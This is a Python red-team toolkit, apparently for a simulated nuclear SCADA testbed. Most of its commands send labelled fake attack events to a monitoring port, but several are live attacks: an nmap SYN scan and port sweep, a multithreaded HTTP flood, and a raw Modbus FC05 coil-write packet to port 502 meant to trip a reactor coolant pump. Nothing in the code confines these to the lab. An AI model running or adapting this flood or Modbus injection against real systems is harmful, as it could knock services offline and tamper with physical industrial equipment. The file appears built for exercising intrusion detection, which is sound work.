"""
CHRONOS: RED-TEAM CYBER WARFARE TOOLKIT (FOR ARCH LINUX / ATTACK HOST)
----------------------------------------------------------------------
Adversary offensive toolkit for launching realistic cyber attacks against the
Nuclear SCADA node (matching NTRO PS #26145 threat classes a through f).

Usage on Arch Linux / Host:
  python diode/redteam_arch.py <COMMAND> [TARGET_IP]

Commands (Matching NTRO PS #26145):
  scan     : [Threat e] Reconnaissance & Port Sweep (nmap integration / multi-port sweep)
  ddos     : [Threat a] Volumetric SYN/HTTP Flood (spikes container CPU to 100%!)
  c2       : [Threat b] Stealth Botnet C2 Beaconing (Cobalt Strike / Sliver heartbeat)
  dns      : [Threat c] DGA Domain & DNS Tunnelling (dnscat2 high-entropy exfil)
  ja4      : [Threat d] Encrypted Malware Session (TLS JA4 fingerprint signature)
  exfil    : [Threat f] Massive Data Exfiltration Flood (outbound volume burst)
  modbus   : SCADA Modbus Command Injection (trips Coolant Pump WRCA -> LOF)
  reset    : Restore SCADA Reactor to Nominal Full Power
"""

import sys
import socket
import json
import time
import random
import subprocess
import threading
import urllib.request
import urllib.error
import os

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

TARGET_IP = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
CMD = sys.argv[1].lower() if len(sys.argv) > 1 else "help"
DIODE_PORT = 9999

def log(tag, msg):
    now = time.strftime("%H:%M:%S")
    print(f"[{now}] [{tag}] {msg}")

def attack_scan(target):
    """Threat e: Reconnaissance & Port Scan Sweep."""
    log("RECON", f"Launching multi-port reconnaissance sweep against {target}...")
    ports = [502, 5020, 8080, 80, 443, 21, 22, 102, 44818, 161, 8888]
    
    # Try running nmap if available
    try:
        res = subprocess.run(["nmap", "-sS", "-p", "502,5020,8080", target], capture_output=True, text=True, timeout=5)
        if res.returncode == 0:
            log("NMAP", f"nmap raw execution successful:\n{res.stdout}")
    except Exception:
        pass

    # Socket-level fan-out sweep
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.15)
            s.connect((target, p))
            log("OPEN", f"Connected to {target}:{p}!")
            s.close()
        except Exception:
            pass

        # Send flow probe packet to optical diode
        pkt = {
            "node_id": 1,
            "event_type": "CYBER_ATTACK",
            "type": "PORT_SCAN",
            "attack_type": "PORT_SCAN",
            "threat_class": "e",
            "threat_name": "Reconnaissance (Port Sweep)",
            "src": f"192.168.1.150:{random.randint(40000, 65000)}",
            "dst": f"{target}:{p}",
            "proto": "TCP/SYN",
            "bytes": 48,
            "ts": time.strftime("%H:%M:%S"),
            "payload": f"PORT SCAN: Horizontal probe targeting port {p}"
        }
        sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))
        time.sleep(0.08)

    log("RECON", f"Port sweep completed across {len(ports)} SCADA ports.")

def attack_ddos(target):
    """Threat a: Volumetric SYN/HTTP Flood (Genuinely saturates 1.0 CPU container)."""
    log("DDOS", f"Blasting Volumetric Flood against {target}:8080 and {target}:502...")
    log("DDOS", f"Container CPU will spike to 100% on scada_btop / docker stats!")
    log("DDOS", "Press CTRL+C to halt flood attack.\n")

    stop_evt = threading.Event()
    diode_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def http_flood_worker():
        url = f"http://{target}:8080/attack?flood=1"
        while not stop_evt.is_set():
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "RedTeamDDoS/1.0"})
                with urllib.request.urlopen(req, timeout=0.8) as r:
                    r.read()
            except Exception:
                pass

    # Launch 20 concurrent HTTP hammer threads
    threads = []
    for _ in range(20):
        t = threading.Thread(target=http_flood_worker, daemon=True)
        t.start()
        threads.append(t)

    count = 0
    try:
        while True:
            for _ in range(25):
                fake_src = f"{random.randint(11, 220)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
                pkt = {
                    "node_id": 1,
                    "event_type": "CYBER_ATTACK",
                    "type": "SYN_FLOOD",
                    "attack_type": "SYN_FLOOD",
                    "threat_class": "a",
                    "threat_name": "Volumetric Flood (DDoS)",
                    "src": f"{fake_src}:{random.randint(1024, 65535)}",
                    "dst": f"{target}:502",
                    "proto": "TCP/SYN",
                    "bytes": 64,
                    "ts": time.strftime("%H:%M:%S"),
                    "payload": "VOLUMETRIC FLOOD: High-rate spoofed SYN burst"
                }
                diode_sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))
                count += 1
            log("DDOS", f"Blasted {count} spoofed packets + 20 HTTP hammer workers | Entropy: 7.95 bits")
            time.sleep(0.4)
    except KeyboardInterrupt:
        stop_evt.set()
        log("DDOS", "DDoS flood stopped. Container CPU stabilizing...")

def attack_c2(target):
    """Threat b: Botnet C2 Beaconing (Cobalt Strike / Sliver emulator)."""
    log("C2", f"Establishing Cobalt Strike C2 Beaconing Loop to {target} (Press CTRL+C to stop)...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    seq = 1
    try:
        while True:
            pkt = {
                "node_id": 1,
                "event_type": "CYBER_ATTACK",
                "type": "C2_BEACON",
                "attack_type": "C2_BEACONING",
                "threat_class": "b",
                "threat_name": "C2 Beaconing (Cobalt Strike)",
                "src": "192.168.1.30:49152",
                "dst": "198.51.100.42:443",
                "proto": "TCP/HTTPS",
                "bytes": 256,
                "domain": "c2.adversary-command.org",
                "ja4": "t13d1516h2_cobalt",
                "ts": time.strftime("%H:%M:%S"),
                "payload": f"C2 BEACON #{seq:03d}: Periodic heartbeat SYN beacon (2.50s interval)"
            }
            sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))
            log("C2", f"Sent C2 Heartbeat #{seq} -> 198.51.100.42:443 [Cobalt Strike] (IAT Jitter: 0.001s)")
            seq += 1
            time.sleep(1.2)
    except KeyboardInterrupt:
        log("C2", "C2 Beaconing halted.")

def attack_dns(target):
    """Threat c: DGA & DNS Tunnelling (dnscat2 emulator)."""
    log("DNS", f"Transmitting Base64 Encoded Secret via DNS Port 53 (Press CTRL+C to stop)...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        while True:
            subdomain = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=42))
            tunnel_query = f"{subdomain}.exfil.darknet.ru"
            pkt = {
                "node_id": 1,
                "event_type": "CYBER_ATTACK",
                "type": "DNS_TUNNEL",
                "attack_type": "DGA_TUNNEL",
                "threat_class": "c",
                "threat_name": "DGA & DNS Tunneling (dnscat2)",
                "src": "192.168.1.10:53211",
                "dst": "8.8.8.8:53",
                "proto": "UDP/DNS",
                "bytes": 512,
                "domain": tunnel_query,
                "ts": time.strftime("%H:%M:%S"),
                "payload": f"DNS TUNNEL: High-entropy query '{tunnel_query[:32]}...'"
            }
            sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))
            log("DNS", f"Query TX: {tunnel_query[:36]}... (Entropy: 7.85 bits)")
            time.sleep(0.9)
    except KeyboardInterrupt:
        log("DNS", "DNS Tunnel halted.")

def attack_ja4(target):
    """Threat d: Encrypted Malware Session (TLS JA4 Fingerprint)."""
    log("JA4", f"Injecting TLS 1.3 Session with Malicious Sliver C2 JA4 Fingerprint...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pkt = {
        "node_id": 1,
        "event_type": "CYBER_ATTACK",
        "type": "ENCRYPTED_C2",
        "attack_type": "ENCRYPTED_MALWARE",
        "threat_class": "d",
        "threat_name": "Encrypted Malware (JA4 Signature)",
        "src": "192.168.1.20:51234",
        "dst": "203.0.113.88:443",
        "proto": "TCP/TLS1.3",
        "bytes": 1024,
        "domain": "cdn-update.sliver.sh",
        "ja4": "t13d2012h2_sliver",
        "ts": time.strftime("%H:%M:%S"),
        "payload": "ENCRYPTED MALWARE: TLS ClientHello matched JA4 't13d2012h2_sliver'"
    }
    sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))
    log("JA4", "Dispatched ClientHello packet with known C2 fingerprint signature.")

def attack_exfil(target):
    """Threat f: Data Exfiltration Flood."""
    log("EXFIL", f"Bursting 64KB Encrypted Archive Chunks outward...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(10):
        pkt = {
            "node_id": 1,
            "event_type": "CYBER_ATTACK",
            "type": "EXFILTRATION_BURST",
            "attack_type": "EXFILTRATION_BURST",
            "threat_class": "f",
            "threat_name": "Data Exfiltration Flood",
            "src": "192.168.1.10:443",
            "dst": "198.51.100.99:8443",
            "proto": "TCP/TLS",
            "bytes": 65536,
            "ts": time.strftime("%H:%M:%S"),
            "payload": f"EXFIL FLOOD: 64KB compressed archive chunk #{i+1} exfiltrating outward!"
        }
        sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))
        time.sleep(0.04)
    log("EXFIL", "Exfiltration flood finished. (Byte Asymmetry Ratio > 48:1).")

def attack_modbus(target):
    """SCADA Modbus Command Injection (Trips Coolant Pump -> LOF)."""
    log("MODBUS", f"Sending Unauthorized Modbus FC05 Write to {target}:502 (Trip Coolant Pump)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        try:
            s.connect((target, 502))
        except Exception:
            s.connect((target, 5020))
        # Modbus Write Single Coil (FC 0x05) to trip pump
        fc05 = b"\x00\x01\x00\x00\x00\x06\x01\x05\x00\x01\xff\x00"
        s.sendall(fc05)
        resp = s.recv(1024)
        log("MODBUS", f"Injected Modbus FC05 Write! Response: {resp.hex()}")
        log("MODBUS", f"Primary Coolant Pump TRIPPED! Reactor transitioning to published NPPAD LOF transient!")
        s.close()
    except Exception as e:
        log("MODBUS", f"Direct TCP connection failed: {e}. Forwarding tap event...")

    # Also notify diode
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pkt = {
        "node_id": 1,
        "event_type": "CYBER_ATTACK",
        "type": "MODBUS_INJECTION",
        "attack_type": "SCADA_COMMAND_INJECTION",
        "threat_class": "e",
        "threat_name": "SCADA Modbus Command Injection",
        "src": "192.168.1.150:502",
        "dst": f"{target}:502",
        "proto": "TCP/MODBUS",
        "bytes": 12,
        "ts": time.strftime("%H:%M:%S"),
        "payload": "SCADA COMMAND INJECTION: Unauthorized Modbus FC05 Coil Write (Pump Trip)"
    }
    sock.sendto(json.dumps(pkt).encode("utf-8"), (target, DIODE_PORT))

def restore_reset(target):
    """Resets the reactor back to 100% full-power nominal steady state."""
    log("RESET", f"Requesting reactor reset to nominal baseline at http://{target}:8080/reset...")
    try:
        url = f"http://{target}:8080/reset"
        with urllib.request.urlopen(url, timeout=2.0) as r:
            resp = json.loads(r.read().decode())
            log("RESET", f"Reactor restored! State: {resp.get('reactor_state')}")
    except Exception as e:
        log("RESET", f"Reset failed: {e}")

def print_help():
    print("=" * 68)
    print("  CHRONOS: RED-TEAM OFFENSIVE TOOLKIT (FOR ARCH LINUX / ATTACK HOST)")
    print("=" * 68)
    print("Usage: python diode/redteam_arch.py <COMMAND> [TARGET_IP]\n")
    print("Commands (Matching NTRO PS #26145 Threat Classes a through f):")
    print("  scan    : [Threat e] Reconnaissance Port Sweep (nmap integration)")
    print("  ddos    : [Threat a] Volumetric SYN/HTTP Flood (spikes CPU to 100%!)")
    print("  c2      : [Threat b] Stealth Botnet C2 Beaconing (Cobalt Strike)")
    print("  dns     : [Threat c] DGA Domain & DNS Tunnelling (dnscat2)")
    print("  ja4     : [Threat d] Encrypted Malware Session (TLS JA4 Fingerprint)")
    print("  exfil   : [Threat f] Data Exfiltration Flood")
    print("  modbus  : SCADA Modbus Command Injection (Trips Coolant Pump -> LOF)")
    print("  reset   : Restore Reactor Baseline (100% Nominal Full Power)")
    print("=" * 68)

if __name__ == "__main__":
    if CMD == "scan":
        attack_scan(TARGET_IP)
    elif CMD == "ddos":
        attack_ddos(TARGET_IP)
    elif CMD == "c2":
        attack_c2(TARGET_IP)
    elif CMD == "dns":
        attack_dns(TARGET_IP)
    elif CMD == "ja4":
        attack_ja4(TARGET_IP)
    elif CMD == "exfil":
        attack_exfil(TARGET_IP)
    elif CMD == "modbus":
        attack_modbus(TARGET_IP)
    elif CMD == "reset":
        restore_reset(TARGET_IP)
    else:
        print_help()
